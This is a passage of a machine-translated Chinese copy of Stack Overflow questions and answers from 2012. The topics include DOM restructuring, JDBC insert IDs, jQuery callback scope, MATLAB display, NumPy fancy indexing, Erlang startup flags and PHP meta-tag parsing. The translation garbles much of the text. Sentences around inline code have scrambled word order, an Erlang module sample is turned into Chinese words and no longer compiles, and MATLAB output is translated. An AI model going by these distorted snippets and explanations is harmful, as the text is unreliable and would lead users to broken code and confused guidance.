您必须通过`innerHTML`etc 获取源代码，操作字符串然后输出字符串。

虽然 DOM 通常不会阻止您错误地拥有`<p>`inside的事实`<span>`，但它们在逻辑上不可能代表您想要的输出，因为没有`HalfWrittenPElement`对象。

您故意违反规则的要求与旨在帮助您的对象模型不一致，因此您只能使用字符串进行破解。

编辑：

尽管如此，浏览器无论如何都会在其内部模型中修复它，因此它最终仍将是格式良好（如果不一定有效）的 HTML。它只是根据实现定义的更正而不是任何规范。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:05:46.697

我没有测试过这个，但你会明白的。您可以自己进行调试和跨浏览器微调；）

我将找到所有`<p>`标签，并为每个标签检查其兄弟姐妹是否为`<span>`,`<span>`和`<p>`. 然后我将`<span>`s 和第二个的文本`<p>`放在第一个`<p>`中。

```
var pTags = document.getElementsByTagName('p');  // get all <p>

for (var i = 0; i < pTags.length; i++) {         // for every one of them
   var a = pTags[i];                             // take the <p> (and call it `a`)

   var b = a.nextElementSibling();               // and the next tag (call it `b`)
   if (b == null) continue;

   var c = b.nextElementSibling();               // and the next tag (call it `c`)
   if (c == null) continue;

   var d = c.nextElementSibling();               // and the next tag (call it `d`)
   if (d == null) continue;

   if (b.tagName.toUpperCase() == 'SPAN' &&      //  if b is <span>
       c.tagName.toUpperCase() == 'SPAN' &&      // and c is <span>
       d.tagName.toUpperCase() == 'P') {         // and d is <p> again

         a.appendChild(b);                       // put b inside a
         a.appendChild(c);                       // put c inside a
         a.appendChild(d.firstChild.nodeValue);  // put text of d inside a
   }
} 
```

请注意，`nextElementSibling`方法不是跨浏览器的，但您可以通过调用来模拟它，`nextSibling`直到它属于该`Element`类型。

还要注意，通过调用`appendChild`元素首先从其原始容器中删除，然后才附加它。这就是我们想要的。

**快速编辑：**

正如其他人指出的那样，您的 html 无效，我一开始没有注意到。但我想你想让`<span>`s 正确关闭。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T23:51:22.717

*（请耐心等待，我是在您最近编辑之前开始写这篇文章的。不过，我认为它仍然有用。）*

我不确定您想要实现什么，但我可以告诉您，使用 JavaScript**很难***完全*实现您所要求的。这主要是因为 HTML 无效。

让我们先来看看**为什么**HTML 会无效。当浏览器解析 HTML 时，它会构建一个嵌套的 DOM 节点**树**。你的第一个例子可以这样表示：

*   `<p>`
    *   1 2 3
*   `<span id="myid">`
    *   `<span id="mytext">`
        *   `<p>`
            *   4 5 6
        *   `<p>`
            *   7 8 9
        *   `<p>`
            *   10 11 12
*   `<p>`
    *   13 14 15

使用 JavaScript 和 DOM，您可以遍历这棵树并对其进行操作。您可以组合来自各种标签的文本节点`<p>`并将它们放在一个`<p>`标签中而不会出现问题。但是您将无法创建第二个示例的结构。它的形状根本不像 DOM 树，所以你不能使用 DOM 来创建 HTML。

`innerHTML`像[Jon Hanna 解释](https://stackoverflow.com/a/12014219/990877)的那样，将 HTML 操作成第二个示例的形状的唯一方法是通过。好消息是浏览器**总是**会将无效的 HTML 纠正为有效的 DOM 结构。坏消息是每个浏览器执行此操作的方式不同，因此您永远不知道最终会得到什么。

唯一真正的解决方案是重新考虑您的 HTML 结构，就像您在最近的编辑中所做的那样。

解决原始问题的方法取决于原始 HTML 的静态程度。我将举一个粗略的例子，我假设：

*   总是正好**5** `<p>`的
*   的第二个到第四个`<p>`总是在里面`<span>`，第一个和第五个总是在它们外面

如果满足这两个条件，您可以使用以下内容：

```
var paragraphs = document.getElementsByTagName('p');
var newParagraphs = [];

function createElementWithText(tagname, text, classname) {
    var classname = classname || '';
    var element = document.createElement(tagname);
    element.className = classname;
    element.appendChild(document.createTextNode(text));
    return element;
}

newParagraphs[0] = createElementWithText('p', paragraphs[0].textContent);
newParagraphs[0].appendChild(createElementWithText('span', paragraphs[1].textContent, 'myclass mytext'));

newParagraphs[1] = createElementWithText('p', paragraphs[2].textContent, 'myclass mytext');

newParagraphs[2] = document.createElement('p');
newParagraphs[2].appendChild(createElementWithText('span', paragraphs[3].textContent, 'myclass mytext'));
newParagraphs[2].appendChild(document.createTextNode(paragraphs[4].textContent)); 
```

我在 JSFiddle 上发布了一个工作示例：[jsfiddle.net/vSrLJ/](http://jsfiddle.net/vSrLJ/)

# jsp - 如何在jsp中将最后插入的id放入jdbc

> ID：12014140
> 
> 赞同：0
> 
> 时间：2012-08-17T22:52:57.350
> 
> 标签：jsp, jdbc, insert

如何从 jsp 中刚刚插入的行中获取 ID？

```
 PreparedStatement ps = con.prepareStatement("INSERT INTO Recipients(CustomerID,Name, Street, City, ZipCode, PhoneNumber, EmailAddress,"
            + " ContactPersonName, ContactPersonSurname, ContactPersonPhoneNumber,ContactPersonEmailAddress) "
            + "values(?,?,?,?,?,?,?,?,?,?,?)"); 
```

我需要使用 Recipients 的 id 将其插入 Parcels

```
PreparedStatement ps2 = con.prepareStatement("INSERT INTO Parcels(TransportTypeID,CustomerID,RecipientID,ParcelAmount, DimLength, DimHeight, DimWidth, ParcelWeigth, Content,"
            + " AdditionalDescription, IsCustomParcel, ReceiptFee, InsuranceAmount, OwnPick, DispatchDate) "
            + "values((?,?,?,?,?,?,?,?,?,?,?,?,?,?,?");

    ps2.setString(1,transportTypeID);
    ps2.setString(2,customerID);
    ps2.setInt(3,recipientID); ... 
```

我试图使用结果集：

```
int recipientID=0;
    ResultSet rs2=st.executeQuery("SELECT * FROM Recipients");
    if(rs2.last())
           {
            recipientID = rs2.getInt("RecipientID");
           } 
```

但它没有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T00:08:24.247

尝试这样的事情：

```
String query = "BEGIN " +
               "  INSERT INTO Recipients( CustomerID, Name, Street, City, ZipCode, PhoneNumber" + 
               "                         ,EmailAddress, ContactPersonName, ContactPersonSurname" +
               "                         ,ContactPersonPhoneNumber, ContactPersonEmailAddress) " +
               "    VALUES(?,?,?,?,?,?,?,?,?,?,?) RETURNING id into ?; " +
               "END;";

CallableStatement cs = conn.prepareCall(query);

cs.setString(1,transportTypeID);
cs.setString(2,customerID);
cs.setInt(3,recipientID);
...
cs.registerOutParameter(12, java.sql.Types.INTEGER);

cs.execute();

int id = cs.getInt(12); 
```

然后使用生成的 id 进行下一次插入。或者你也可以把它全部放入一个过程中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T17:18:53.163

我找到了解决方案： `ResultSet rs2=st.executeQuery("SELECT * FROM Recipients ORDER BY RecipientID DESC Limit 1;"); while(rs2.next()) { recipientID = rs2.getInt(1); }`

# r - 如何强制 R 加载包，`library()` 由于依赖而失败？

> ID：12014145
> 
> 赞同：3
> 
> 时间：2012-08-17T22:53:33.947
> 
> 标签：r, dependencies, package, loading, cran

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:08:55.123

如果您无法安装依赖项，我认为您唯一的选择是从 packageX 的 DESCRIPTION 文件的 Depends 字段中删除这些软件包并尝试重建 packageX

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T17:29:24.837

您可以查看包的源代码以确定您需要哪些功能以及它们需要哪些依赖项。您可能希望在这部分与包的作者/维护者合作。您可以创建不具有依赖项和您不需要的其他功能的包的私有版本。

如果这仅供您个人使用并且软件包的许可证允许它（gpl 和类似的），那么您不需要作者许可来提取您想要的那些片段。如果您想将您的包链接到此以进行分发，那么您应该与原作者合作。我知道有几个包作者想要我的一个包中的几个函数，我同意加载我的整个包（和依赖项）对于他们想要做的事情来说太过分了，所以我和他们一起工作，他们有他们包中的功能而无需依赖我的。当我更新其中一个功能时，我也会向他们发送一份副本以更新他们的副本。

# javascript - jQuery淡出回调错误

> ID：12014146
> 
> 赞同：1
> 
> 时间：2012-08-17T22:53:40.643
> 
> 标签：javascript, jquery

Firebug 表明我有`TypeError: a.ownerDocument is undefined`这个代码：

```
$(this).text('Updated!').fadeOut('900',  function() { 
  $(this).text('Update').attr('disabled', 'disabled').show()
}); 
```

更完整的片段如下：

```
$(".update-role").click(function() {
  var newRole = $(this).prev().val();
  var userId  = $(this).parents('tr').attr('id');  // e.g. 'user-role-18'
  userId = userId.split('-');
  userId = userId[2]; // so we get '18'
  $.getJSON('services/update_staff_role.php', {r: newRole, id: userId}, function(j) {
    if(j.result == 'success') {
    $(this).text('Updated!').fadeOut('900',  function() { 
          $(this).text('Update').attr('disabled', 'disabled').show()
        });
    } else {
      alert(j.reason);
    }
  });
  console.info(userId, newRole);
}); 
```

可能是因为我正在使用`this`，因为我正在使用`callback`另一个内部`callback`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T22:55:42.797

添加`var _this = $(this);`then 而不是`$(this).text..`use `_this.text...`，因为`$(this)`参考`$.getJSON`：

```
$(".update-role").click(function() {
  var _this = $(this);
  var newRole = $(this).prev().val();
  var userId  = $(this).parents('tr').attr('id');
  userId = userId.split('-');
  userId = userId[2];
  $.getJSON('services/update_staff_role.php', {r: newRole, id: userId}, function(j) {
    if(j.result == 'success') {
    _this.text('Updated!').fadeOut('900',  function() { 
          $(this).text('Update').attr('disabled', 'disabled').show()
        });
    } else {
      alert(j.reason);
    }
  });
  console.info(userId, newRole);
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T22:56:40.877

是的`this`，当在回调中时，不是指被点击的按钮。在调用 $.getJSON 之前，您可以将按钮引用存储在变量中，然后在回调中访问该变量。

# matlab - Matlab display a variable from function

> ID：12014149
> 
> 赞同：0
> 
> 时间：2012-08-17T22:54:07.763
> 
> 标签：matlab

I'm new to Matlab and I have a function and I need to display a variable from running the main file (but the main file does access the function)...

I have tried to use fprintf(n);

Thanks :)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:07:20.937

MATLAB 函数与 C 中的函数`fprintf()`非常相似`fprintf()`。如果您的变量`n`是整数，那么您应该这样做

```
fprintf('%d\n', n); 
```

一个有趣的功能是您还可以将多个数值和文字文本打印到屏幕上。例如

```
A1 = [9.9, 9900];
A2 = [8.8,  7.7 ; ...
      8800, 7700];
fprintf('X is %4.2f meters or %8.3f mm\n', A1, A2); 
```

where`%4.2f`取第一列的元素，取第二列的`A1`元素`%8.3f`。在序列中，它重复`A2`打印第一行，然后打印第二行。输出是

```
X 为 9.90 米或 9900.000 毫米
X 为 8.80 米或 8800.000 毫米
X 为 7.70 米或 7700.000 毫米

```

如果您想了解有关可以使用的说明符的更多详细信息`fprintf()`，您应该查看[MathWorks 文档](http://www.mathworks.com/help/techdoc/ref/fprintf.html)。

# php - Copied-and-pasted domain name getting ‎ added to end

> ID：12014155
> 
> 赞同：0
> 
> 时间：2012-08-17T22:54:47.450
> 
> 标签：php, mysql, html

When I copy a domain name from Google Maps and then paste it into a form I built, it enters it into a MySQL database with **`&#8206;`** appended at the end of the domain name.

Any idea how I could strip that **`&#8206;`** off of the domain name?

The relevant code is below

```
<div class="friend5title"><label for="url">Website:</label></div> 
    <div class="friend5field"><input name="website" type="text" id="website" maxlength="150"></div>

$website = mysql_real_escape_string($website);

mysql_query("INSERT INTO submission VALUES ('$website')"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:02:49.507

它是一个控制字符（[http://en.wikipedia.org/wiki/Left-to-right_mark](http://en.wikipedia.org/wiki/Left-to-right_mark)）。

忽略我之前所有的答案，我刚刚意识到（因为我写得很快）它不是 unicode 它实际上是 HTML 实体格式，所以你需要去掉那个 HTML 实体：

```
preg_replace('/(&#8206;)/', '', $string); 
```

另一种方法是实际净化您的字符串并将其从所有 HTML 实体中清除，因为它实际上不应该包含任何内容。通常可能会有特殊字符，`&amp;`但这些不应该存在于从我认为的输入字段中获取的 URL 中。

这是一个关于删除 HTML 实体的问题，答案很明确：[如何删除 html 特殊字符？](https://stackoverflow.com/questions/657643/how-to-remove-html-special-chars)

至于它发生的原因：可能有人有一个外国浏览器，它人为地使输入中的文本以某种方式进行，但反过来又添加了这个 html 实体。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:45:48.567

在输入字段中粘贴时，您确实复制了一个从左到右的字符，其 unicode 编号为 8206。由于浏览器显然确实有一个不在某些 unicode 字符集（如 UTF-8）中的表单，因此它将该字符发送到服务器作为数字实体`&#8206;`。服务器必须对这些进行解码，或者必须更改表单（和页面）以接受 UTF-8。

就您的 LTR 角色而言，这似乎是多余的。您可以添加一个`onchange=...`以删除 URL 的字符 < 0 和 > 127。他们仍然是角色，所以很容易做到。

# yii - Yii UrlManager：如何在我的 API 中使用 Ruby REST 处理 .json 和 .xml 文件？

> ID：12014161
> 
> 赞同：1
> 
> 时间：2012-08-17T22:55:37.040
> 
> 标签：yii

我正在 Yii 中创建一个 REST API，我想像这样构建我的 URL：

```
/api/my_model
/api/my_model.xml
/api/my_model.json 
```

第一个返回 HTML 视图，.xml 返回 XML，.json 返回 JSON。

这是我在 main.php 中的 urlManager 规则中的内容：

```
array('api/list/', 'pattern'=>'api/<model:\w+>', 'verb'=>'GET'), 
```

我想如果我传递了一个格式变量，那么如果它是空白的，我知道它应该返回 HTML，或者如果传递了格式，则返回 json/xml。我试过这个：

```
array('api/list/', 'pattern'=>'api/<model:\w+>.<format:(xml|json)>', 'verb'=>'GET'), 
```

它适用于 .xml 和 .json，但不适用于我的 url 只是 /api/list

我的问题是如何在 urlManager 中设置 URL 以使其工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:40:00.217

在 php 正则表达式中，`?`用于匹配 1 或不匹配前一个字符，所以

```
a? means zero or one of a 
```

然后我们可以在规则中使用它：

```
array('api/list/', 'pattern'=>'api/<model:\w+>.<format:(xml|json)>?', 'verb'=>'GET'),
// notice the ? at the end of format: 
```

但是，上述内容也将允许以下类型的网址：`api/my_model.`

为避免这种情况，您可以将*点*移动到格式变量中：

```
array('api/list/', 'pattern'=>'api/<model:\w+><format:(.xml|.json)>?', 'verb'=>'GET'), 
```

但这将导致`format`是`.xml`or `.json`。所以，我们有另一种选择：

```
array('api/list/', 'pattern'=>'api/<model:\w+>(.<format:(xml|json)>)?', 'verb'=>'GET'), 
```

这应该适用于您想要的所有网址，并且也可以匹配`format`为`xml`or `json`。

# f# - F# 获取环境变量作为泛型集合

> ID：12014179
> 
> 赞同：6
> 
> 时间：2012-08-17T22:59:38.610
> 
> 标签：f#, environment-variables

在 .NET 4.5 **Environment.GetEnvironmentVariables()**中，将环境变量作为非泛型**Collections.IDictionary**返回。

有什么方法可以将 F# 中的环境变量作为通用集合获取？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-17T23:22:49.423

我不确定 .NET 是否有任何将环境变量作为类型化泛型集合返回的方法（该`GetEnvironmentVariables`方法自 .NET 1.1 以来就存在，因此它不是泛型的）。如果您想自己将结果转换为通用字典，您可以执行以下操作：

```
let envVars = 
  System.Environment.GetEnvironmentVariables()
  |> Seq.cast<System.Collections.DictionaryEntry>
  |> Seq.map (fun d -> d.Key :?> string, d.Value :?> string)
  |> dict 
```

这首先将结果转换为一系列`DictionaryEntry`元素，然后提取键和值并将它们转换为字符串，然后`IDictionary<string, string>`使用内置`dict`函数进行构建。

# python - NumPy 中更高级的索引？

> ID：12014186
> 
> 赞同：3
> 
> 时间：2012-08-17T23:00:57.213
> 
> 标签：python, numpy

我正在使用带有 NumPy 的查找表 (LUT) 实现颜色插值。有一次，我使用 RGB 值的 4 个最高有效位从 17x17x17x4 LUT 中选择相应的 CMYK 值。现在它看起来像这样：

```
import numpy as np
rgb = np.random.randint(16, size=(3, 1000, 1000))
lut = np.random.randint(256, size=(17, 17, 17, 4))
cmyk = lut[rgb[0], rgb[1], rgb[2]] 
```

第一个问题来了……有没有更好的办法？您可以告诉 NumPy 的索引`lut`是沿轴 0 存储的`rgb`，而不必实际写出来，这似乎很自然。`cmyk = lut.fancier_take(rgb, axis=0)`那么在 NumPy中有什么类似的东西吗？

此外，我留下了一个 shape 数组`(1000, 1000, 4)`，因此为了与输入保持一致，我需要使用几个来旋转它`swapaxes`：

```
cmyk = cmyk.swapaxes(2, 1).swapaxes(1, 0).copy() 
```

而且我还需要添加复制语句，因为如果不是，结果数组在内存中不连续，这会给以后带来麻烦。

现在我倾向于在花哨的索引之前旋转 LUT，然后按照以下方式做一些事情：

```
swapped_lut = lut.swapaxes(2, 1).swapaxes(1, 0)
cmyk = swapped_lut[np.arange(4), rgb[0], rgb[1], rgb[2]] 
```

但同样，它似乎并不正确......必须有一种更优雅的方式来做到这一点，对吧？像`cmyk = lut.even_fancier_take(rgb, in_axis=0, out_axis=0)`...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T23:48:33.903

我建议使用`tuple`强制索引按行，`np.rollaxis`或`transpose`代替`swapaxes`：

```
lut[tuple(rgb)].transpose(2, 0, 1).copy() 
```

或者

```
np.rollaxis(lut[tuple(rgb)], 2).copy() 
```

要首先滚动轴，请使用：

```
np.rollaxis(lut, -1)[(Ellipsis,) + tuple(rgb)] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:30:58.250

`lut`如果您 swap ，您将需要执行以下操作，`np.arange(4)`这将不起作用：

```
swapped_lut = np.rollaxis(lut, -1)
cmyk = swapped_lut[:, rgb[0], rgb[1], rgb[2]].copy() 
```

或者你可以更换

```
cmyk = lut[rgb[0], rgb[1], rgb[2]]
cmyk = cmyk.swapaxes(2, 1).swapaxes(1, 0).copy() 
```

和：

```
cmyk = lut[tuple(rgb)]
cmyk = np.rollaxis(cmyk, -1).copy() 
```

但是要尝试一步完成所有操作，...也许：

```
rng = np.arange(4).reshape(4, 1, 1)
cmyk = lut[rgb[0], rgb[1], rgb[2], rng] 
```

这根本不是很可读是吗？

看看这个问题的答案，[Numpy multi-dimensional array indexing swaps axis order](https://stackoverflow.com/questions/11942747/numpy-multi-dimensional-array-indexing-swaps-axis-order)。它很好地解释了 numpy 如何广播多个数组以获得输出大小。在这里，您要在 lut 中创建广播到 (4, 1000, 1000) 的索引。希望这有点道理。

# matlab - Matlab：创建 3D 立方体 RGB 并显示它

> ID：12014188
> 
> 赞同：3
> 
> 时间：2012-08-17T23:01:04.440
> 
> 标签：matlab, 3d, matrix, show, rgb

我会尽量做到准确和简短。

我有一个体积（128x128x128）和一个掩码（与 [0|1|2] 值相同的大小）

我想使 3D 体积矩阵成为具有 RGB 的 3D 图像，并将掩码中标记的点存储在每个通道（红色、绿色、蓝色）中。

这是通过获取该 3D 立方体的切片来使用 2D 表示，而不是一遍又一遍地计算它以使事情变得更快（在我的项目中非常重要），所以实际上，3D 体积 + rgb 就像一个商店用于 128 张 2D 图像。

问题是，我必须采取哪些步骤以及如何完成所有这些： - 创建一个 128x128x128x3 的卷？- 定义一个新的颜色图（原来是灰色的）？- 加入每个频道？- 如何使用 imagesc/whatever 来显示该立方体的一个切片，其颜色点与掩码中标记的颜色相同（例如：imageRGB(:,:,64)）？

这只是我的猜测，但我什至不知道如何正确地做到这一点......我有点迷茫，希望你能帮助我，这是一段可能是错误的代码，但可能会帮助你

```
% Create the matrix 4D
ovImg = zeros(size(volImg,1),size(volImg,2),size(volImg,3),3);    % 128x128x128x3
% Store in each channel the points marked as groups
ovImg(:,:,:,1) = volImg .* (mask==1);
ovImg(:,:,:,2) = volImg .* (mask==2);
ovImg(:,:,:,3) = volImg .* (mask==3); 
```

非常感谢！！

更新：

我在透明度和颜色图方面遇到了一些问题，这就是我所做的。

```
% Create the matrix 4D
ovImg = zeros(size(volImg,1),size(volImg,2),size(volImg,3),3);
% Store in each channel the points marked as groups
ovImg(:,:,:,1) = imaNorm.*(mask==1);
ovImg(:,:,:,2) = imaNorm.*(mask==2);
ovImg(:,:,:,3) = imaNorm.*(mask==3);

[X,Y,Z] = meshgrid(1:128,1:128,1:128);
imaNorm = volImg - min(volImg(:));   
maxval = max(imaNorm(:));        
ovImg  = imaNorm + mask * maxval;

N= ceil(maxval);
c = [linspace(0,1,N)' zeros(N,2)];
my_colormap = [c(:,[1 2 3]) ; c(:,[3 1 2]) ; c(:,[2 3 1])];

figure;
imshow(squeeze(ovImg(:,:,64)),my_colormap);

figure;
imagesc(squeeze(mask(:,:,64))); 
```

结果（叠加图像/蒙版）有 ![叠加和蒙版图片](../Images/462597990c69c8bccff42afdbb6ae285.png) 什么想法吗？再次感谢大家

* * *

最后更新：使用 Gunther Struyf 建议的另一种方法，我得到了我想要的。谢谢朋友，我真的很感激，希望这对其他人也有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T07:53:36.393

您可以使用带有[颜色图的](http://www.mathworks.nl/help/techdoc/ref/colormap.html)[imshow](http://www.mathworks.nl/help/toolbox/images/ref/imshow.html)从灰度图像（您拥有）中“伪造”RGB 图像。对于比例，我不会将其相乘，而是为该值添加一个偏移量，因此每个蒙版都是颜色图中的不同范围。

要绘制 3d 矩阵的切片，您可以对其进行索引，然后对其进行[挤压](http://www.mathworks.nl/help/techdoc/ref/squeeze.html)以删除生成的单例维度：

例子：

```
[X,Y,Z]=meshgrid(1:128,1:128,1:128);
volImg =5*sin(X/3)+13*cos(Y/5)+8*sin(Z/10);
volImg=volImg-min(volImg(:));
mask = repmat(floor(linspace(0,3-2*eps,128))',[1 128 128]);

maxval=max(volImg(:));
ovImg=volImg+mask*maxval;
imshow(squeeze(ovImg(:,:,1)),jet(ceil(max(ovImg(:))))); 
```

未屏蔽的原始图像 ( `imshow(squeeze(volImg(:,:,1)),jet(ceil(maxval)))`)

![在此处输入图像描述](../Images/23da27ff72370450d8d3fc08f6207133.png)

结果与掩码（上面的代码块）：

![在此处输入图像描述](../Images/0796b1ebf68f1e5a2067804f719e7db2.png)

对于不同的颜色图，请参见[此处](http://www.mathworks.nl/help/techdoc/ref/colormap.html)，或创建您自己的颜色图。例如，你的面具有三个值，所以让我们将它们与 R、G 和 B 匹配：

```
N = ceil(maxval);
c = [linspace(0,1,N)' zeros(N,2)];
my_colormap = [c(:,[1 2 3]) ; c(:,[3 1 2]) ; c(:,[2 3 1])];
figure
imshow(squeeze(ovImg(:,:,1)),my_colormap); 
```

这使：

![在此处输入图像描述](../Images/d7ce6a53f6c85b8994234943d998e638.png)

## 其他方法：

现在我理解了您的问题，我看到您从一开始就完全正确，您只需要将变量重新调整为 0 到 1 之间的值，因为来自[imshow](http://www.mathworks.nl/help/toolbox/images/ref/imshow.html)：

> 颜色强度可以在 0.0 到 1.0 的区间内指定。

您可以使用：

```
minval=min(volImg(:));
maxval=max(volImg(:));
volImg=(volImg-minval)/(maxval-minval); 
```

接下来是您的代码：

```
ovImg = zeros([size(volImg),3]);
ovImg(:,:,:,1) = volImg .* (mask==1);
ovImg(:,:,:,2) = volImg .* (mask==2);
ovImg(:,:,:,3) = volImg .* (mask==3); 
```

你现在只需要绘制它：

```
imshow(squeeze(ovImg(:,:,64,:))) 
```

# erlang - 为什么当我尝试使用 erl -s 启动应用程序时它不起作用

> ID：12014189
> 
> 赞同：1
> 
> 时间：2012-08-17T23:01:10.520
> 
> 标签：erlang

就像是

```
erl -s crypto start -s application start public_key 
```

适用于加密但不适用于 application:start(..)。通常我会调用应用程序主管，但不会调用应用程序本身。正常的做法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-19T05:47:50.107

-s 标志期望

> 模块乐趣 Arg1 Arg2 ..

并将其执行为

> 模块：乐趣（[Arg1，Arg2，..]）。

因此，它将参数作为列表传递。

运行`-s application start public_key`时会调用`application:start([public_key])`，这是不受支持的。这有效：`application:start(public_key)`

如果没有创建包含启动 public_key 应用程序的函数的模块，我没有找到解决方法，例如：

> -模块（我的应用程序）。
> 
> -出口（[开始/1]）。
> 
> 开始（[应用程序]）-> 应用程序：开始（应用程序）。

并称它为

> erl -s crypto start -s myapp start public_key

# java - Castor 与 log4j 的集成

> ID：12014190
> 
> 赞同：2
> 
> 时间：2012-08-17T23:01:12.320
> 
> 标签：java, spring, log4j, castor

我已经在我的 Java 应用程序中集成了 Castor - XML 映射，并希望通过 log4j 获取一些日志信息（例如检查编组的 xml）。

我将此添加到我的 log4j 配置文件中，但我没有看到任何与 castor 相关的日志记录。我是否需要做任何额外的事情才能让 Castor 与 log4j 一起工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T11:06:33.490

定义日志类别将对您有所帮助

```
log4j.category.org.castor=DEBUG 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-09T19:21:42.783

我不知道[Serkan Arıkuşu 的回答](https://stackoverflow.com/a/15407490/453273)是过时还是不正确，但在 castor-xml 1.4.1 中，要使用的日志记录类别是 org.exolab.castor.xml：

```
log4j.category.org.exolab.castor.xml=DEBUG 
```

# gstreamer - 无法在 Ubuntu 12.04 上制作 ARToolKit

> ID：12014192
> 
> 赞同：0
> 
> 时间：2012-08-17T23:01:17.140
> 
> 标签：gstreamer, ubuntu-12.04, artoolkit

我在华硕 eee PC 上运行**Ubuntu 12.04**，在遵循**ARToolKit**教程之后，当我`make`在选择**GStreamer**后进入该部分时，我在 VideoGStreamer/video.c 中收到很多“未定义参考”错误。在这里粘贴：

[http://pastebin.com/BHz60Wyb](http://pastebin.com/BHz60Wyb)

我在 freenode 上的#gstreamer 上问了同样的问题，他们暗示这可能是 ARToolKit 的问题。然后我看到了这个：

[http://ubuntuforums.org/showpost.php?s=2260b48cec6cd38078e5f9f6d7beee47&p=12091315&postcount=3](http://ubuntuforums.org/showpost.php?s=2260b48cec6cd38078e5f9f6d7beee47&p=12091315&postcount=3)

官方的 ARToolKit 支持现在似乎已经死了，所以这就是我在这里问这个的原因。

感谢您阅读我的悲伤故事。

**更新：我在**[http://www.kameda-lab.org/_local/imagelab.tsukuba.ac.jp/ubuntu1004+opencv21/ARToolKitk/index-](http://www.kameda-lab.org/_local/imagelab.tsukuba.ac.jp/ubuntu1004+opencv21/ARToolKitk/index-e.html)找到了一个由 Yoshinari Kameda 先生制作的补丁，它与 V4L2 + Ubuntu 完美配合[e.html](http://www.kameda-lab.org/_local/imagelab.tsukuba.ac.jp/ubuntu1004+opencv21/ARToolKitk/index-e.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T23:29:30.107

```
-Download "freeglut3-dev" form Ubuntu Software center
-Download "libxmu-dev" form Ubuntu Software center
-Download "libXi-dev" form Ubuntu Software center
-Download "libglew1.5-dev" form Ubuntu Software center
**I don't know if the next two downloads are necessary**
-Download "GStreamer plugins for mms, wavpack, quicktime,
musepack" form Ubuntu Software center
-Download "GStreamer plugins for aac, xvid, mpeg2, faad" form Ubuntu
Software center
-Dowload "libgstreamer0.10-dev" form Ubuntu Software center

-Download "ARToolKit-2.72.1.tgz"
-unzip "ARToolKit-2.72.1.tgz"
-Download the scrpit "installARToolKit.sh" from this website:
 github.com/enekochan/installation-scripts
-Run the script.
+Select option 6 "GStreamer Media Framework"
+Select n
+Select n
-Type the following commands:
+cd ARtoolkit/bin
+./simpleTest 
```

# objective-c - 检查 NavigationItem.title 是否等于 @"part"

> ID：12014193
> 
> 赞同：0
> 
> 时间：2012-08-17T23:01:23.343
> 
> 标签：objective-c, ios, xcode, sdk

```
NSString *part = self.navigationItem.title;
    if (part == @"Case") {
        NSLog(@"title: %@", part);
    } 
```

它不会记录标题，但如果我：

```
NSLog(@"title: %@", part); 
```

我得到：

```
title: Case 
```

这是我的错误吗？我确定没有空格。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T23:05:09.333

为了比较你必须使用的字符串`isEqualToString`

```
if ([part isEqualToString:@"Case"]) {
    NSLog(@"title: %@", part);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:05:01.067

你不会像那样比较字符串。

```
isEqualToString: 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:05:59.283

尝试

```
if([part isEqualToString:@"Case"]) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T23:06:03.753

在 Obj-C 对象上使用`==`仅比较指针。这适用于任何 obj-c 对象。比较 obj-c 对象的标准方法是 with `-isEqual:`，如

```
if ([oneObj isEqual:anotherObj]) ... 
```

在字符串的情况下，有一个专门的版本叫做`-isEqualToString:`，所以你可以说

```
if ([part isEqualToString:@"Case"]) ... 
```

专门的函数主要是为了更好的类型检查`NSString*`而提供的，因为参数必须是一个 while`-isEqual:`允许 any `id`。除此之外，它的性能也会比一般`-isEqual:`情况稍微高一点，但这几乎不重要。

其他一些类也有专门的比较函数，比如`-[NSData isEqualToData:]`,`-[NSArray isEqualToArray:]`和许多其他类。

# php - 使用 PHP 获取 Facebook 元标记

> ID：12014196
> 
> 赞同：4
> 
> 时间：2012-08-17T23:01:38.227
> 
> 标签：php, facebook, facebook-opengraph

我正在尝试从我的 HTML 中获取 Facebook 的元标记。

我正在使用简单的 html dom 从站点获取所有 html 数据。我试过 preg_replace，但没有运气。

例如，我想获取此 fb 元标记的内容：

```
<meta content="IMAGE URL" property="og:image" /> 
```

希望有人能帮忙！:-)

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-17T23:55:17.020

我打算建议使用[get_meta_tags()](http://php.net/manual/en/function.get-meta-tags.php)但它似乎不起作用（对我来说）：s

```
<?php
$tags = get_meta_tags('http://www.example.com/');
echo $tags['og:image'];
?> 
```

但我宁愿建议使用[DOMDocument](http://php.net/manual/en/class.domdocument.php)反正：

```
<?php
$sites_html = file_get_contents('http://example.com');

$html = new DOMDocument();
@$html->loadHTML($sites_html);
$meta_og_img = null;
//Get all meta tags and loop through them.
foreach($html->getElementsByTagName('meta') as $meta) {
    //If the property attribute of the meta tag is og:image
    if($meta->getAttribute('property')=='og:image'){ 
        //Assign the value from content attribute to $meta_og_img
        $meta_og_img = $meta->getAttribute('content');
    }
}
echo $meta_og_img;
?> 
```

希望能帮助到你
